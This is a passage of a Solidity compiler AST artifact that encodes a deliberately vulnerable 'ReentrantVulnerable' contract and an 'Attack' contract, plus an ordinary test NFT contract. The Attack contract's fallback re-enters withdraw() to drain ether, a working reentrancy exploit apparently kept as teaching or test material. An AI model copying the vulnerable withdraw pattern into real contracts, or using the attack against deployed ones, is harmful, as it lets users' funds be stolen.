\"\""}],"expression":{"expression":{"id":3091,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"355:3:12","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":3092,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","src":"355:10:12","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":3093,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"call","nodeType":"MemberAccess","src":"355:15:12","typeDescriptions":{"typeIdentifier":"t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$","typeString":"function (bytes memory) payable returns (bool,bytes memory)"}},"id":3095,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"names":["value"],"nodeType":"FunctionCallOptions","options":[{"id":3094,"name":"bal","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3077,"src":"378:3:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"src":"355:27:12","typeDescriptions":{"typeIdentifier":"t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value","typeString":"function (bytes memory) payable returns (bool,bytes memory)"}},"id":3097,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"355:31:12","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_bytes_memory_ptr_$","typeString":"tuple(bool,bytes memory)"}},"nodeType":"VariableDeclarationStatement","src":"339:47:12"},{"expression":{"arguments":[{"id":3100,"name":"sent","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3090,"src":"404:4:12","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"4661696c656420746f2073656e6420657468657220","id":3101,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"410:23:12","typeDescriptions":{"typeIdentifier":"t_stringliteral_224cc15859f3bc8990d4f8746fb4f9ad5ccdbcb7ca20356ee2a5fabd0dec216c","typeString":"literal_string \"Failed to send ether \""},"value":"Failed to send ether "}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_224cc15859f3bc8990d4f8746fb4f9ad5ccdbcb7ca20356ee2a5fabd0dec216c","typeString":"literal_string \"Failed to send ether \""}],"id":3099,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"396:7:12","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":3102,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"396:38:12","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":3103,"nodeType":"ExpressionStatement","src":"396:38:12"}]},"functionSelector":"3ccfd60b","id":3105,"implemented":true,"kind":"function","modifiers":[],"name":"withdraw","nameLocation":"241:8:12","nodeType":"FunctionDefinition","parameters":{"id":3074,"nodeType":"ParameterList","parameters":[],"src":"249:2:12"},"returnParameters":{"id":3075,"nodeType":"ParameterList","parameters":[],"src":"259:0:12"},"scope":3118,"src":"232:209:12","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"body":{"id":3116,"nodeType":"Block","src":"499:45:12","statements":[{"expression":{"expression":{"arguments":[{"id":3112,"name":"this","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-28,"src":"524:4:12","typeDescriptions":{"typeIdentifier":"t_contract$_ReentrantVulnerable_$3118","typeString":"contract ReentrantVulnerable"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_contract$_ReentrantVulnerable_$3118","typeString":"contract ReentrantVulnerable"}],"id":3111,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"516:7:12","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":3110,"name":"address","nodeType":"ElementaryTypeName","src":"516:7:12","typeDescriptions":{}}},"id":3113,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"516:13:12","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":3114,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"balance","nodeType":"MemberAccess","src":"516:21:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":3109,"id":3115,"nodeType":"Return","src":"509:28:12"}]},"functionSelector":"12065fe0","id":3117,"implemented":true,"kind":"function","modifiers":[],"name":"getBalance","nameLocation":"456:10:12","nodeType":"FunctionDefinition","parameters":{"id":3106,"nodeType":"ParameterList","parameters":[],"src":"466:2:12"},"returnParameters":{"id":3109,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3108,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3117,"src":"490:7:12","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3107,"name":"uint256","nodeType":"ElementaryTypeName","src":"490:7:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"489:9:12"},"scope":3118,"src":"447:97:12","stateMutability":"view","virtual":false,"visibility":"public"}],"scope":3196,"src":"57:489:12","usedErrors":[]},{"abstract":false,"baseContracts":[],"contractDependencies":[],"contractKind":"contract","fullyImplemented":true,"id":3195,"linearizedBaseContracts":[3195],"name":"Attack","nameLocation":"557:6:12","nodeType":"ContractDefinition","nodes":[{"constant":false,"functionSelector":"33684a05","id":3121,"mutability":"mutable","name":"reentrantVulnerable","nameLocation":"597:19:12","nodeType":"VariableDeclaration","scope":3195,"src":"570:46:12","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_contract$_ReentrantVulnerable_$3118","typeString":"contract ReentrantVulnerable"},"typeName":{"id":3120,"nodeType":"UserDefinedTypeName","pathNode":{"id":3119,"name":"ReentrantVulnerable","nodeType":"IdentifierPath","referencedDeclaration":3118,"src":"570:19:12"},"referencedDeclaration":3118,"src":"570:19:12","typeDescriptions":{"typeIdentifier":"t_contract$_ReentrantVulnerable_$3118","typeString":"contract ReentrantVulnerable"}},"visibility":"public"},{"body":{"id":3132,"nodeType":"Block","src":"665:80:12","statements":[{"expression":{"id":3130,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3126,"name":"reentrantVulnerable","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3121,"src":"675:19:12","typeDescriptions":{"typeIdentifier":"t_contract$_ReentrantVulnerable_$3118","typeString":"contract ReentrantVulnerable"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":3128,"name":"_reentrantVulnerable","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3123,"src":"717:20:12","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":3127,"name":"ReentrantVulnerable","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3118,"src":"697:19:12","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_ReentrantVulnerable_$3118_$","typeString":"type(contract ReentrantVulnerable)"}},"id":3129,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"697:41:12","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_contract$_ReentrantVulnerable_$3118","typeString":"contract ReentrantVulnerable"}},"src":"675:63:12","typeDescriptions":{"typeIdentifier":"t_contract$_ReentrantVulnerable_$3118","typeString":"contract ReentrantVulnerable"}},"id":3131,"nodeType":"ExpressionStatement","src":"675:63:12"}]},"id":3133,"implemented":true,"kind":"constructor","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":3124,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3123,"mutability":"mutable","name":"_reentrantVulnerable","nameLocation":"643:20:12","nodeType":"VariableDeclaration","scope":3133,"src":"635:28:12","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":3122,"name":"address","nodeType":"ElementaryTypeName","src":"635:7:12","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"634:30:12"},"returnParameters":{"id":3125,"nodeType":"ParameterList","parameters":[],"src":"665:0:12"},"scope":3195,"src":"623:122:12","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"body":{"id":3150,"nodeType":"Block","src":"779:124:12","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3142,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"arguments":[{"id":3138,"name":"reentrantVulnerable","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3121,"src":"801:19:12","typeDescriptions":{"typeIdentifier":"t_contract$_ReentrantVulnerable_$3118","typeString":"contract ReentrantVulnerable"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_contract$_ReentrantVulnerable_$3118","typeString":"contract ReentrantVulnerable"}],"id":3137,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"793:7:12","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":3136,"name":"address","nodeType":"ElementaryTypeName","src":"793:7:12","typeDescriptions":{}}},"id":3139,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"793:28:12","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":3140,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"balance","nodeType":"MemberAccess","src":"793:36:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"hexValue":"31","id":3141,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"833:7:12","subdenomination":"ether","typeDescriptions":{"typeIdentifier":"t_rational_1000000000000000000_by_1","typeString":"int_const 1000000000000000000"},"value":"1"},"src":"793:47:12","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3149,"nodeType":"IfStatement","src":"789:108:12","trueBody":{"id":3148,"nodeType":"Block","src":"842:55:12","statements":[{"expression":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"id":3143,"name":"reentrantVulnerable","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3121,"src":"856:19:12","typeDescriptions":{"typeIdentifier":"t_contract$_ReentrantVulnerable_$3118","typeString":"contract ReentrantVulnerable"}},"id":3145,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"withdraw","nodeType":"MemberAccess","referencedDeclaration":3105,"src":"856:28:12","typeDescriptions":{"typeIdentifier":"t_function_external_nonpayable$__$returns$__$","typeString":"function () external"}},"id":3146,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"856:30:12","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":3147,"nodeType":"ExpressionStatement","src":"856:30:12"}]}}]},"id":3151,"implemented":true,"kind":"fallback","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":3134,"nodeType":"ParameterList","parameters":[],"src":"759:2:12"},"returnParameters":{"id":3135,"nodeType":"ParameterList","parameters":[],"src":"779:0:12"},"scope":3195,"src":"751:152:12","stateMutability":"payable","virtual":false,"visibility":"external"},{"body":{"id":3158,"nodeType":"Block","src":"936:40:12","statements":[{"expression":{"arguments":[{"hexValue":"6920676f74206e6f2069646561","id":3155,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"953:15:12","typeDescriptions":{"typeIdentifier":"t_stringliteral_4f9c42ed167b9feed305f7672354cfd76c424fea19fe2c909663497fcd46330c","typeString":"literal_string \"i got no idea\""},"value":"i got no idea"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_4f9c42ed167b9feed305f7672354cfd76c424fea19fe2c909663497fcd46330c","typeString":"literal_string \"i got no idea\""}],"id":3154,"name":"revert","nodeType":"Identifier","overloadedDeclarations":[-19,-19],"referencedDeclaration":-19,"src":"946:6:12","typeDescriptions":{"typeIdentifier":"t_function_revert_pure$_t_string_memory_ptr_$returns$__$","typeString":"function (string memory) pure"}},"id":3156,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"946:23:12","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":3157,"nodeType":"ExpressionStatement","src":"946:23:12"}]},"id":3159,"implemented":true,"kind":"receive","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":3152,"nodeType":"ParameterList","parameters":[],"src":"916:2:12"},"returnParameters":{"id":3153,"nodeType":"ParameterList","parameters":[],"src":"936:0:12"},"scope":3195,"src":"909:67:12","stateMutability":"payable","virtual":false,"visibility":"external"},{"body":{"id":3181,"nodeType":"Block","src":"1017:141:12","statements":[{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3166,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"id":3163,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"1035:3:12","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":3164,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"value","nodeType":"MemberAccess","src":"1035:9:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"hexValue":"31","id":3165,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1048:7:12","subdenomination":"ether","typeDescriptions":{"typeIdentifier":"t_rational_1000000000000000000_by_1","typeString":"int_const 1000000000000000000"},"value":"1"},"src":"1035:20:12","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"id":3162,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"1027:7:12","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$returns$__$","typeString":"function (bool) pure"}},"id":3167,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"1027:29:12","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":3168,"nodeType":"ExpressionStatement","src":"1027:29:12"},{"expression":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"argumentTypes":[],"expression":{"id":3169,"name":"reentrantVulnerable","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3121,"src":"1066:19:12","typeDescriptions":{"typeIdentifier":"t_contract$_ReentrantVulnerable_$3118","typeString":"contract ReentrantVulnerable"}},"id":3171,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"deposit","nodeType":"MemberAccess","referencedDeclaration":3073,"src":"1066:27:12","typeDescriptions":{"typeIdentifier":"t_function_external_payable$__$returns$__$","typeString":"function () payable external"}},"id":3173,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"names":["value"],"nodeType":"FunctionCallOptions","options":[{"hexValue":"31","id":3172,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1101:7:12","subdenomination":"ether","typeDescriptions":{"typeIdentifier":"t_rational_1000000000000000000_by_1","typeString":"int_const 1000000000000000000"},"value":"1"}],"src":"1066:43:12","typeDescriptions":{"typeIdentifier":"t_function_external_payable$__$returns$__$value","typeString":"function () payable external"}},"id":3174,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"1066:45:12","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":3175,"nodeType":"ExpressionStatement","src":"1066:45:12"},{"expression":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"id":3176,"name":"reentrantVulnerable","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3121,"src":"1121:19:12","typeDescriptions":{"typeIdentifier":"t_contract$_ReentrantVulnerable_$3118","typeString":"contract ReentrantVulnerable"}},"id":3178,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"withdraw","nodeType":"MemberAccess","referencedDeclaration":3105,"src":"1121:28:12","typeDescriptions":{"typeIdentifier":"t_function_external_nonpayable$__$returns$__$","typeString":"function () external"}},"id":3179,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"1121:30:12","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":3180,"nodeType":"ExpressionStatement","src":"1121:30:12"}]},"functionSelector":"9e5faafc","id":3182,"implemented":true,"kind":"function","modifiers":[],"name":"attack","nameLocation":"991:6:12","nodeType":"FunctionDefinition","parameters":{"id":3160,"nodeType":"ParameterList","parameters":[],"src":"997:2:12"},"returnParameters":{"id":3161,"nodeType":"ParameterList","parameters":[],"src":"1017:0:12"},"scope":3195,"src":"982:176:12","stateMutability":"payable","virtual":false,"visibility":"external"},{"body":{"id":3193,"nodeType":"Block","src":"1216:45:12","statements":[{"expression":{"expression":{"arguments":[{"id":3189,"name":"this","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-28,"src":"1241:4:12","typeDescriptions":{"typeIdentifier":"t_contract$_Attack_$3195","typeString":"contract Attack"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_contract$_Attack_$3195","typeString":"contract Attack"}],"id":3188,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"1233:7:12","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":3187,"name":"address","nodeType":"ElementaryTypeName","src":"1233:7:12","typeDescriptions":{}}},"id":3190,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"1233:13:12","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":3191,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"balance","nodeType":"MemberAccess","src":"1233:21:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":3186,"id":3192,"nodeType":"Return","src":"1226:28:12"}]},"functionSelector":"12065fe0","id":3194,"implemented":true,"kind":"function","modifiers":[],"name":"getBalance","nameLocation":"1173:10:12","nodeType":"FunctionDefinition","parameters":{"id":3183,"nodeType":"ParameterList","parameters":[],"src":"1183:2:12"},"returnParameters":{"id":3186,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3185,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3194,"src":"1207:7:12","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3184,"name":"uint256","nodeType":"ElementaryTypeName","src":"1207:7:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1206:9:12"},"scope":3195,"src":"1164:97:12","stateMutability":"view","virtual":false,"visibility":"public"}],"scope":3196,"src":"548:715:12","usedErrors":[]}],"src":"32:1232:12"},"id":12},"contracts/test/BasicNft.sol":{"ast":{"absolutePath":"contracts/test/BasicNft.sol","exportedSymbols":{"Address":[1489],"BasicNft":[3268],"Context":[1511],"ERC165":[1710],"ERC721":[998],"IERC165":[1722],"IERC721":[1114],"IERC721Metadata":[1159],"IERC721Receiver":[1132],"Math":[2587],"Strings":[1686]},"id":3269,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":3197,"literals":["solidity","^","0.8",".7"],"nodeType":"PragmaDirective","src":"32:23:13"},{"absolutePath":"@openzeppelin/contracts/token/ERC721/ERC721.sol","file":"@openzeppelin/contracts/token/ERC721/ERC721.sol","id":3198,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":3269,"sourceUnit":999,"src":"57:57:13","symbolAliases":[],"unitAlias":""},{"abstract":false,"baseContracts":[{"baseName":{"id":3199,"name":"ERC721","nodeType":"IdentifierPath","referencedDeclaration":998,"src":"137:6:13"},"id":3200,"nodeType":"InheritanceSpecifier","src":"137:6:13"}],"contractDependencies":[],"contractKind":"contract","fullyImplemented":true,"id":3268,"linearizedBaseContracts":[3268,998,1159,1114,1710,1722,1511],"name":"BasicNft","nameLocation":"125:8:13","nodeType":"ContractDefinition","nodes":[{"constant":true,"functionSelector":"78ce9035","id":3203,"mutability":"constant","name":"TOKEN_URI","nameLocation":"173:9:13","nodeType":"VariableDeclaration","scope":3268,"src":"150:132:13","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":3201,"name":"string","nodeType":"ElementaryTypeName","src":"150:6:13","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"value":{"hexValue":"697066733a2f2f62616679626569673337696f6972373673376d67356f6f6265746e636f6a636d3363336878617379643472766964346a71687934676b61686567342f3f66696c656e616d653d302d5055472e6a736f6e","id":3202,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"193:89:13","typeDescriptions":{"typeIdentifier":"t_stringliteral_f5eed4f63f16dc8435ed5e031f22f9553384324656005540ac9ece13d0969af8","typeString":"literal_string \"ipfs://bafybeig37ioir76s7mg5oobetncojcm3c3hxasyd4rvid4jqhy4gkaheg4/?filename=0-PUG.json\""},"value":"ipfs://bafybeig37ioir76s7mg5oobetncojcm3c3hxasyd4rvid4jqhy4gkaheg4/?filename=0-PUG.json"},"visibility":"public"},{"constant":false,"id":3205,"mutability":"mutable","name":"s_tokenCounter","nameLocation":"304:14:13","nodeType":"VariableDeclaration","scope":3268,"src":"288:30:13","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3204,"name":"uint256","nodeType":"ElementaryTypeName","src":"288:7:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"private"},{"anonymous":false,"id":3209,"name":"DogMinted","nameLocation":"330:9:13","nodeType":"EventDefinition","parameters":{"id":3208,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3207,"indexed":true,"mutability":"mutable","name":"tokenId","nameLocation":"356:7:13","nodeType":"VariableDeclaration","scope":3209,"src":"340:23:13","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3206,"name":"uint256","nodeType":"ElementaryTypeName","src":"340:7:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"339:25:13"},"src":"324:41:13"},{"body":{"id":3220,"nodeType":"Block","src":"408:35:13","statements":[{"expression":{"id":3218,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3216,"name":"s_tokenCounter","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3205,"src":"418:14:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"30","id":3217,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"435:1:13","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"418:18:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3219,"nodeType":"ExpressionStatement","src":"418:18:13"}]},"id":3221,"implemented":true,"kind":"constructor","modifiers":[{"arguments":[{"hexValue":"446f676965","id":3212,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"392:7:13","typeDescriptions":{"typeIdentifier":"t_stringliteral_e5d21699003d762b953d66adecbe4f97c4791cae2f281f96a4beb7efcb7bbcf6","typeString":"literal_string \"Dogie\""},"value":"Dogie"},{"hexValue":"444f47","id":3213,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"401:5:13","typeDescriptions":{"typeIdentifier":"t_stringliteral_b5b35d1f7dc7cf1448a70456de4980702e1fdae4e057d31003c0e1e4b3c4bde2","typeString":"literal_string \"DOG\""},"value":"DOG"}],"id":3214,"kind":"baseConstructorSpecifier","modifierName":{"id":3211,"name":"ERC721","nodeType":"IdentifierPath","referencedDeclaration":998,"src":"385:6:13"},"nodeType":"ModifierInvocation","src":"385:22:13"}],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":3210,"nodeType":"ParameterList","parameters":[],"src":"382:2:13"},"returnParameters":{"id":3215,"nodeType":"ParameterList","parameters":[],"src":"408:0:13"},"scope":3268,"src":"371:72:13","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"body":{"id":3240,"nodeType":"Block","src":"475:139:13","statements":[{"expression":{"arguments":[{"expression":{"id":3225,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"495:3:13","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":3226,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","src":"495:10:13","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":3227,"name":"s_tokenCounter","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3205,"src":"507:14:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3224,"name":"_safeMint","nodeType":"Identifier","overloadedDeclarations":[548,577],"referencedDeclaration":548,"src":"485:9:13","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,uint256)"}},"id":3228,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"485:37:13","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":3229,"nodeType":"ExpressionStatement","src":"485:37:13"},{"eventCall":{"arguments":[{"id":3231,"name":"s_tokenCounter","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3205,"src":"547:14:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3230,"name":"DogMinted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3209,"src":"537:9:13","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_uint256_$returns$__$","typeString":"function (uint256)"}},"id":3232,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"537:25:13","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":3233,"nodeType":"EmitStatement","src":"532:30:13"},{"expression":{"id":3238,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3234,"name":"s_tokenCounter","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3205,"src":"572:14:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3237,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3235,"name":"s_tokenCounter","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3205,"src":"589:14:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"hexValue":"31","id":3236,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"606:1:13","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 